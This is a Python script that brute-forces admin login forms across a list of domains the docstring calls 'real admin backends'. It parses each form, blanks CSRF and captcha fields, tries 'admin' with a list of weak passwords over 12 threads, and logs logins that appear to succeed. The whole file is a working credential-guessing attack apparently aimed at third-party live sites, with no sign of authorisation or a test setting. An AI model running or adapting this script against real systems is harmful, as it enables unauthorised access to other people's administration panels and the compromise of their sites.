#!/usr/bin/env python3
"""form_brute.py - generic login form detect + weak pass brute for real admin backends
Reads /tmp/real_admins2.txt (domain\tpath\tstatus:len), detects form fields, POSTs weak passwords.
Verify: 302/200 redirect to non-login in-site path + response differs from login page size.
"""
import urllib.request, urllib.parse, re, http.cookiejar
from concurrent.futures import ThreadPoolExecutor, as_completed

OUT = "/tmp/form_brute_hits.txt"
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
LOCK_ = __import__("threading").Lock()
PWS = ["admin123", "123456", "admin", "admin888", "12345678", "666888", "admin@123",
       "a123456", "admin123456", "123456789", "admin666", "888888", "000000", "123123",
       "admin2023", "admin2024", "admin2025", "Aa123456", "abc123456", "admin@2023",
       "123456a", "a123456789", "admin111", "123321", "5201314", "admin520", "qwer1234",
       "password", "1234567890", "admin1234", "1q2w3e4r", "pass123", "test123", "admin!@#"]

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(op, url, timeout=8, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.geturl() if hasattr(e, "geturl") else url, e.read().decode("utf-8", "ignore")
    except Exception:
        return 0, url, ""

def log(s):
    with LOCK_:
        open(OUT, "a").write(s + "\n")

def find_login_form(body, base_url):
    """return (form_action, {field_name: type}) for the first login-ish form"""
    m = re.search(r"<form[^>]*action=[\"']([^\"']*)[\"'][^>]*>", body, re.I)
    action = m.group(1) if m else ""
    if not action.startswith("http"):
        action = urllib.parse.urljoin(base_url, action)
    fields = {}
    for fm in re.finditer(r"<input[^>]*name=[\"']([^\"']+)[\"'][^>]*>", body, re.I):
        name = fm.group(1)
        tag = fm.group(0)
        ftype = re.search(r"type=[\"']([^\"']+)[\"']", tag, re.I)
        ftype = ftype.group(1).lower() if ftype else "text"
        fields[name] = ftype
    return action, fields

def check(domain, path):
    op = get_opener()
    url = "http://%s%s" % (domain, path)
    code, final, body = fetch(op, url)
    if code != 200 or not body:
        return
    login_size = len(body)
    action, fields = find_login_form(body, url)
    # find user/pass fields
    user_f = None
    pass_f = None
    for name, ftype in fields.items():
        nl = name.lower()
        if pass_f is None and ("pass" in nl or "pwd" in nl or ftype == "password"):
            pass_f = name
        elif user_f is None and ("user" in nl or "login" in nl or "name" in nl or "account" in nl):
            user_f = name
    if not pass_f:
        return  # no recognizable login form
    # other fields (csrf/token etc) keep empty
    for pw in PWS:
        payload = {}
        for name, ftype in fields.items():
            nl = name.lower()
            if name == user_f:
                payload[name] = "admin"
            elif name == pass_f:
                payload[name] = pw
            elif ftype == "hidden" or "token" in nl or "csrf" in nl or "check" in nl or "validate" in nl or "code" in nl:
                payload[name] = ""
        data = urllib.parse.urlencode(payload)
        try:
            code2, final2, resp = fetch(op, action, data=data)
        except Exception:
            continue
        resp_size = len(resp)
        # success: redirected to non-login path OR response differs strongly from login page
        if final2 != url and "login" not in final2.lower():
            log("!!! FORM_HIT %s %s admin/%s -> %s" % (domain, path, pw, final2))
            print("!!! FORM_HIT %s admin/%s" % (domain, pw), flush=True)
            return
        if resp_size > 0 and resp_size != login_size and "password" not in resp[:500].lower() and "密码" not in resp[:500]:
            # check body has admin markers
            if any(k in resp.lower() for k in ["dashboard", "index.php", "logout", "退出", "欢迎", "welcome", "管理首页", "frame"]):
                log("!!! FORM_HIT %s %s admin/%s [body-mark]" % (domain, path, pw))
                print("!!! FORM_HIT %s admin/%s [body-mark]" % (domain, pw), flush=True)
                return
    print("  done %s %s" % (domain, path), flush=True)

def main():
    targets = []
    seen = set()
    for line in open("/tmp/real_admins2.txt"):
        parts = line.rstrip("\n").split("\t")
        if len(parts) >= 2:
            d, p = parts[0], parts[1]
            if d not in seen:
                seen.add(d)
                targets.append((d, p))
    print("form_brute: %d targets" % len(targets), flush=True)
    with ThreadPoolExecutor(max_workers=12) as ex:
        futs = {ex.submit(check, d, p): (d, p) for d, p in targets}
        for fut in as_completed(futs):
            fut.result()
    print("[form_brute done]", flush=True)

if __name__ == "__main__":
    main()
